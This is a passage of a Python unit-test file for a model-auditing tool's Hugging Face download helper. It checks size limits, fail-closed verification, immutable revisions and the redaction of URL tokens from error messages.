            siblings=[SimpleNamespace(rfilename="model.bin")],
        )
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(path="model.bin", size=file_size)]

        with pytest.raises(Exception, match="Unable to determine file size"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=10 * 1024 * 1024,
            )

        mock_paginated_listing.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_huggingface_repo_files_paginated",
        side_effect=AssertionError("direct capped file download should not list the repository tree"),
    )
    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_rejects_underreported_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        mock_paginated_listing: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Capped direct files should verify the returned cache file before scanning."""
        downloaded_file = tmp_path / "downloaded_file.bin"
        downloaded_file.write_bytes(b"oversized")
        mock_hf_hub_download.return_value = str(downloaded_file)
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(
            sha=TEST_COMMIT_SHA,
            siblings=[SimpleNamespace(rfilename="model.bin")],
        )
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(path="model.bin", size=4)]

        with pytest.raises(Exception, match=r"Downloaded file size .* exceeds maximum allowed size"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=4,
            )

        mock_paginated_listing.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_huggingface_repo_files_paginated",
        side_effect=AssertionError("direct capped file download should not list the repository tree"),
    )
    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_rejects_unverifiable_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        mock_paginated_listing: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Capped direct files fail closed if the downloaded cache path cannot be verified."""
        mock_hf_hub_download.return_value = str(tmp_path / "missing.bin")
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(
            sha=TEST_COMMIT_SHA,
            siblings=[SimpleNamespace(rfilename="model.bin")],
        )
        mock_hf_api.return_value.get_paths_info.return_value = [SimpleNamespace(path="model.bin", size=4)]

        with pytest.raises(Exception, match="Unable to verify downloaded file size"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=4,
            )

        mock_paginated_listing.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_huggingface_repo_files_paginated",
        side_effect=AssertionError("direct capped file download should not list the repository tree"),
    )
    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_redacts_metadata_errors(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        mock_paginated_listing: MagicMock,
    ) -> None:
        """Metadata preflight errors should not expose direct URL credentials."""
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(
            sha=TEST_COMMIT_SHA,
            siblings=[SimpleNamespace(rfilename="model.bin")],
        )
        mock_hf_api.return_value.get_paths_info.side_effect = Exception(
            "HEAD failed for https://huggingface.co/test/model/resolve/main/model.bin?token=hf_secret"
        )

        with pytest.raises(Exception, match="Failed to download file from") as exc_info:
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin?token=hf_secret",
                max_size=10 * 1024 * 1024,
            )

        error = str(exc_info.value)
        assert "hf_secret" not in error
        assert "token=" not in error
        assert "https://huggingface.co/test/model/resolve/main/model.bin" in error
        mock_paginated_listing.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_rejects_missing_immutable_revision(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
    ) -> None:
        """Capped downloads fail closed instead of sizing and fetching a mutable branch."""
        mock_hf_api.return_value.repo_info.return_value = SimpleNamespace(sha=None)

        with pytest.raises(Exception, match="Unable to determine immutable revision"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=10 * 1024 * 1024,
            )

        mock_hf_api.return_value.get_paths_info.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_without_max_size_skips_metadata_preflight(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Uncapped direct file downloads keep existing behavior and skip metadata lookup."""
        mock_path = str(tmp_path / "downloaded_file.bin")
        mock_hf_hub_download.return_value = mock_path

        result = download_file_from_hf("https://huggingface.co/test/model/resolve/main/model.bin")

        mock_hf_api.assert_not_called()
        mock_hf_hub_download.assert_called_once()
        assert result == Path(mock_path)

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_zero_max_size_skips_metadata_preflight(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A zero maximum size should preserve ModelAudit's unlimited-size behavior."""
        mock_path = str(tmp_path / "downloaded_file.bin")
        mock_hf_hub_download.return_value = mock_path

        result = download_file_from_hf(
            "https://huggingface.co/test/model/resolve/main/model.bin",
            max_size=0,
        )

        mock_hf_api.assert_not_called()
        mock_hf_hub_download.assert_called_once()
        assert result == Path(mock_path)

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_negative_max_size_rejected(
        self,
        mock_hf_hub_download: MagicMock,
        mock_hf_api: MagicMock,
    ) -> None:
        """Negative direct-download limits should not silently disable enforcement."""
        with pytest.raises(Exception, match="Maximum file size must be non-negative"):
            download_file_from_hf(
                "https://huggingface.co/test/model/resolve/main/model.bin",
                max_size=-1,
            )

        mock_hf_api.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_failure(self, mock_hf_hub_download):
        """Test that file download failures are handled properly."""
        mock_hf_hub_download.side_effect = Exception(
            "Download failed for https://huggingface.co/test/model/resolve/main/file.bin?token=hf_secret"
        )

        url = "https://huggingface.co/test/model/resolve/main/file.bin?token=hf_secret"
        with pytest.raises(Exception, match="Failed to download file from") as exc_info:
            download_file_from_hf(url)

        error = str(exc_info.value)
        assert "hf_secret" not in error
        assert "token=" not in error
        assert "https://huggingface.co/test/model/resolve/main/file.bin" in error

    def test_download_file_invalid_url(self):
        """Test that invalid file URLs raise appropriate errors."""
        with pytest.raises(ValueError):
            download_file_from_hf("https://github.com/user/repo/blob/main/file.bin")

    def test_download_file_missing_dependency(self):
        """Test error when huggingface-hub is not installed."""
        real_import = __import__
        with patch("builtins.__import__") as mock_import:

            def side_effect(name, *args, **kwargs):
                if name == "huggingface_hub":
                    raise ImportError("No module named 'huggingface_hub'")
                return real_import(name, *args, **kwargs)

            mock_import.side_effect = side_effect
            with pytest.raises(ImportError, match="huggingface-hub package is required"):
                download_file_from_hf("https://huggingface.co/test/model/resolve/main/file.bin")
